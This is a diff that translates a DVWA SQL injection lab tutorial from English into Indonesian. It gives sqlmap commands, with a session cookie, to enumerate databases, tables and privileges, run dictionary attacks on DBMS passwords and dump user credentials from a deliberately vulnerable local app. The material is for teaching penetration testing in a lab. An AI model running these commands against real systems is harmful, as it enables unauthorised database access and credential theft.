@@ -72,7 +72,7 @@
      1. Masukkan "1" ke text box.  
      2. Klik Submit.
 
-   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.86.jpg)
+   * ![](/assets/1. Manual injection.PNG)
 
 5. Tamper with request?
 
@@ -94,6 +94,7 @@
 7. Buka Notepad
 
 8. Paste Referer URL ke Notepad
+
 9. Copy Cookie Information
 
    * **Langkah:**  
@@ -142,190 +143,168 @@
    * Akan terlihat current-user dan current-database
    * ![](/assets/hasil sqlmap.PNG)
 
-| **Section 11: Using SqlMap to Obtain Database Management Username and Password** |
+| **Section 5: Menggunakan SqlMap untuk Mendapatkan Username dan Password Database Management** |
 | :--- |
 
 
-1. Obtain Database Management Username and Password
+1.Mendapatkan username dan password Database Management
 
-   * **Notes\(FYI\):**
-     * You must have completed [Lesson 4](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson4/index.html) to see the **db\_hacker **in Step 2.
-     * Replace 192.168.1.106 with Fedora's IP address obtained in \(Section 3, Step 3\).
-     * Replace \( **lpb5g4uss9kp70p8jccjeks621 **\) with your PHPSESSID obtained from \(Section 9, Step 10\).
-   * **Instructions:**
-     1. ./sqlmap.py -u "http:// 192.168.1.106 /dvwa/vulnerabilities/sqli/?id=1 & Submit=Submit" --cookie="PHPSESSID= **lpb5g4uss9kp70p8jccjeks621 **; security=low" --string="Surname" --users --password
-        * -u, Target URL
-        * --cookie, HTTP Cookie header
-        * -string, Provide a string set that is always present after valid or invalid query.
-        * --users, list database management system users
-        * --password, list database management password for system users.
-   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.100.jpg)
+* **Langkah:**
 
-2. Obtain Database Management Username and Password \(Part 2\)
+1.Masukkan perintah dibawah:
 
-   * **Instructions:**
-     1. Use Dictionary Attack? Y
-     2. Dictionary Location?  &lt; Press Enter &gt;
-   * **Notes\(FYI\):**  
-     1. Notice the password for username db\_hacker was cracked.
+```
+sqlmap -u "
+http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
+" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" --string="Surname" --users --password
+```
 
-   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.101.jpg)
+o ![](/assets/sqlmap 3.PNG)
 
-3. Obtain db\_hacker Database Privileges seperti itu
+2.Mendapatkan Username dan Password Database Management \(Bagian 2\)
 
-   * **Note\(FYI\):**
-     * Replace 192.168.1.106 with Fedora's IP address obtained in \(Section 3, Step 3\).
-     * Replace \( **lpb5g4uss9kp70p8jccjeks621 **\) with your PHPSESSID obtained from \(Section 9, Step 10\).
-   * **Instructions:**  
-     1. ./sqlmap.py -u "http:// 192.168.1.106 /dvwa/vulnerabilities/sqli/?id=1 & Submit=Submit" --cookie="PHPSESSID= **lpb5g4uss9kp70p8jccjeks621 **; security=low" -U db\_hacker --privileges
+o**Langkah:**
 
-     * -u, Target URL
-     * --cookie, HTTP Cookie header
-     * -U, Specify database management user
-     * --privileges, list database management system user's privileges
+0.Use Dictionary Attack? Y
 
-   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.103.jpg)
+1.Dictionary Location? &lt;Tekan enter&gt;
 
-4. View Results: Obtain db\_hacker Database Privileges
+o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.101.jpg")
 
-   * **Instructions:**  
-     1. Notice that DBMS user "db\_hacker" has administrative privileges  
-     2. Notice that "db\_hacker" can log in from anywhere, via the "%" wildcard operator.
+3.Mendapatkan Privileges database db\_hacker
 
-   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.104.jpg)
+o**Langkah:**
 
-| **Section 12: Obtain a list of all Databases** |
+0../sqlmap.py -u "[http://\*\*192.168.56.102\*\*/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit](http://**192.168.56.102**/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit)" --cookie="PHPSESSID=**lpb5g4uss9kp70p8jccjeks621**; security=low" -U db\_hacker --privileges
+
+o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image003.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.103.jpg")
+
+4.Menampilkan hasil
+
+o**Langkah:**
+
+0.Notice that DBMS user "db\_hacker" has administrative privileges
+
+1.Notice that "db\_hacker" can log in from anywhere, via the "%" wildcard operator.
+
+o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.104.jpg")
+
+| **Section 6: Mendapatkan daftar database yang ada** |
 | :--- |
 
 
-1. Obtain a list of all databases
+1.Mendapatkan daftar database yang ada
 
-   * **Notes\(FYI\):**
-     1. Obtain the referer link from \(Section 9, Step 10\), which is placed after the "-u" flag below.
-     2. Obtain the cookie line from \(Section 9, Step 10\), which is placed after the "--cookie" flag below.
-     3. Replace 192.168.1.106 with Fedora's IP address obtained in \(Section 3, Step 3\).
-     4. Replace \( **lpb5g4uss9kp70p8jccjeks621 **\) with your PHPSESSID obtained from \(Section 9, Step 10\).
-   * **Instructions:**
-     1. ./sqlmap.py -u "http:// 192.168.1.106 /dvwa/vulnerabilities/sqli/?id=1 & Submit=Submit" --cookie="PHPSESSID= **lpb5g4uss9kp70p8jccjeks621 **; security=low" --dbs
-        * -u, Target URL
-        * --cookie, HTTP Cookie header
-        * --dbs, List database management system's databases.
-   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.98.jpg)
+o **Langkah:**
 
-2. Review Results: Obtain a list of all databases
+1. Masukkan perintah dibawah :
+   ```
+   sqlmap.py -u "
+   http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
+   " --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" --dbs
+   ```
 
-   * **Notes\(FYI\):**  
-     1. Notice that sqlmap supplies a list of available databases.
+o ![](/assets/sqlmap 5.PNG)
 
-   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.99.jpg)
+2.Melihat hasil
 
-| **Section 13: Obtain "dvwa" tables and contents** |
+o![](/assets/sqlmap 6.PNG)
+
+| **Section 7: Mendapatkan isi table “dvwa”** |
 | :--- |
 
 
-1. Obtain "dvwa" tables and contents
+1.Mendapatkan isi table “dvwa”
 
-   * **Notes\(FYI\):**
-     1. Obtain the referer link from \(Section 9, Step 10\), which is placed after the "-u" flag below.
-     2. Obtain the cookie line from \(Section 9, Step 10\), which is placed after the "--cookie" flag below.
-     3. Replace 192.168.1.106 with Fedora's IP address obtained in \(Section 3, Step 3\).
-     4. Replace \( **lpb5g4uss9kp70p8jccjeks621**\) with your PHPSESSID obtained from \(Section 9, Step 10\).
-   * **Instructions:**  
-     1. ./sqlmap.py -u "http:// 192.168.1.106 /dvwa/vulnerabilities/sqli/?id=1 & Submit=Submit" --cookie="PHPSESSID= **lpb5g4uss9kp70p8jccjeks621 **; security=low" -D dvwa --tables
+o**Langkah:**
 
-     * -u, Target URL
-     * --cookie, HTTP Cookie header
-     * -D, Specify Database
-     * --tables, List Database Tables
+1../sqlmap.py -u "[http://\*\*192.168.56.102\*\*/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit](http://**192.168.56.102**/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit)" --cookie="PHPSESSID=**lpb5g4uss9kp70p8jccjeks621**; security=low" -D dvwa --tables
 
-   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.91.jpg)
+o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image007.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.91.jpg")
 
-2. Viewing "dvwa" tables and content results
+2.Melihat hasil
 
-   * **Notes\(FYI\):**  
-     1. Notice sqlmap listed two tables: guestbook and users.
+o**Notes\(FYI\):**
 
-   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.92.jpg)
+1.Notice sqlmap listed two tables: guestbook and users.
 
-3. Obtain columns for table dvwa.users
+o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.92.jpg")
 
-   * **Notes\(FYI\):**
-     1. Obtain the referer link from \(Section 9, Step 10\), which is placed after the "-u" flag below.
-     2. Obtain the cookie line from \(Section 9, Step 10\), which is placed after the "--cookie" flag below.
-     3. Replace 192.168.1.106 with Fedora's IP address obtained in \(Section 3, Step 3\).
-     4. Replace \( **lpb5g4uss9kp70p8jccjeks621 **\) with your PHPSESSID obtained from \(Section 9, Step 10\).
-   * **Instructions:**  
-     1. ./sqlmap.py -u "http:// 192.168.1.106 /dvwa/vulnerabilities/sqli/?id=1 & Submit=Submit" --cookie="PHPSESSID= **lpb5g4uss9kp70p8jccjeks621 **; security=low" -D dvwa -T users --columns
+3.Mendapatkan kolom dari table dvwa.users
 
-     * -u, Target URL
-     * --cookie, HTTP Cookie header
-     * -D, Specify Database
-     * -T, Specify the Database Table
-     * --columns, List the Columns of the Database Table.
+o**Langkah:**
 
-   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.93.jpg)
+1../sqlmap.py -u "[http://\*\*192.168.56.102\*\*/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit](http://**192.168.56.102**/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit)" --cookie="PHPSESSID=**lpb5g4uss9kp70p8jccjeks621**; security=low" -D dvwa -T users --columns
 
-4. Viewing Results: columns for table dvwa.users
+o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image009.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.93.jpg")
 
-   * **Notes\(FYI\):**  
-     1. Notice that there are both a user and password columns in the dvwa.users table.
+4.Melihat hasil
 
-   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.94.jpg)
+o**Notes\(FYI\):**
 
-5. Obtain Users and their Passwords from table dvwa.users \(Part 1\)
+1.Notice that there are both a user and password columns in the dvwa.users table.
 
-   * **Notes\(FYI\):**
-     1. Obtain the referer link from \(Section 9, Step 10\), which is placed after the "-u" flag below.
-     2. Obtain the cookie line from \(Section 9, Step 10\), which is placed after the "--cookie" flag below.
-     3. Replace 192.168.1.106 with Fedora's IP address obtained in \(Section 3, Step 3\).
-     4. Replace \( **lpb5g4uss9kp70p8jccjeks621 **\) with your PHPSESSID obtained from \(Section 9, Step 10\).
-   * **Instructions:**  
-     1. ./sqlmap.py -u "http:// **192.168.1.106 **/dvwa/vulnerabilities/sqli/?id=1 & Submit=Submit" --cookie="PHPSESSID= **lpb5g4uss9kp70p8jccjeks621 **; security=low" -D dvwa -T users -C user,password --dump
+o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.94.jpg")
 
-     * -u, Target URL
-     * --cookie, HTTP Cookie header
-     * -D, Specify Database
-     * -C, List user and password columns
-     * --dump, Dump table contents
+5.Mendapatkan user dan password dari tabel dvwa.users \(Bagian 1\)
 
-   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.95.jpg)
+o**Langkah:**
 
-6. Obtain Users and their Passwords from table dvwa.users \(Part 2\)
+1../sqlmap.py -u "[http://\*\*192.168.56.102\*\*/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit](http://**192.168.56.102**/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit)" --cookie="PHPSESSID=**lpb5g4uss9kp70p8jccjeks621**; security=low" -D dvwa -T users -C user,password --dump
 
-   * **Instructions:**  
-     1. Do you want to use the LIKE operator? Y  
-     2. Recognize possible HASH values? Y  
-     3. What's the dictionary location? &lt;Press Enter&gt;  
-     4. Use common password suffixes? y
+o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image011.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.95.jpg")
 
-   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.96.jpg)
+6.Mendapatkan user dan password dari tabel dvwa.users \(Bagian 2\)
 
-7. Review Results: Users and their Passwords from table dvwa.users
+o**Langkah:**
 
-   * **Notes\(FYI\):**  
-     1. Notice how sqlmap nicely displays passwords for each user.
+1.Do you want to use the LIKE operator? Y
 
-   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.97.jpg)
+2.Recognize possible HASH values? Y
 
-| **Section 14: Proof of Lab Using John the Ripper** |
+3.What's the dictionary location? &lt;Tekan Enter&gt;
+
+4.Use common password suffixes? y
+
+o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.96.jpg")
+
+7.Melihat hasil
+
+o**Notes\(FYI\):**
+
+1.Notice how sqlmap nicely displays passwords for each user.
+
+o![](file:///C:/Users/Dwika/AppData/Local/Temp/msohtmlclip1/01/clip_image013.jpg "http://www.computersecuritystudent.com/SECURITY\_TOOLS/DVWA/DVWAv107/lesson7/index.97.jpg")
+
+| **Section 8: Menggunakan john the ripper** |
 | :--- |
 
 
-1. Proof of Lab
-   * **Instructions:**
-     1. Bring up a new terminal, see \(Section 7, Step 1\)
-     2. cd /pentest/database/sqlmap
-     3. find output/\* -print \| xargs ls -l
-     4. date
-     5. echo "Your Name"
-        * Replace the string "Your Name" with your actual name.
-        * e.g., echo "John Gray"
-   * **Proof of Lab Instructions**
-     **:**
-     1. Do a  &lt; PrtScn &gt;
-     2. Paste into a word document
-     3. Upload to Moodle
-   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.102.jpg)
+1.Proof of Lab
 
+o**Instructions:**
 
+1.Bring up a new terminal, see \(Section 7, Step 1\)
+
+2.cd /pentest/database/sqlmap
+
+3.find output/\* -print \| xargs ls -l
+
+4.date
+
+5.echo "Your Name"
+
+§Replace the string "Your Name" with your actual name.
+
+§e.g., echo "John Gray"
+
+o**Proof of Lab Instructions:**
+
+1.Do a &lt;PrtScn&gt;
+
+2.Paste into a word document
+
+3.Upload to Moodle
+
+o
 
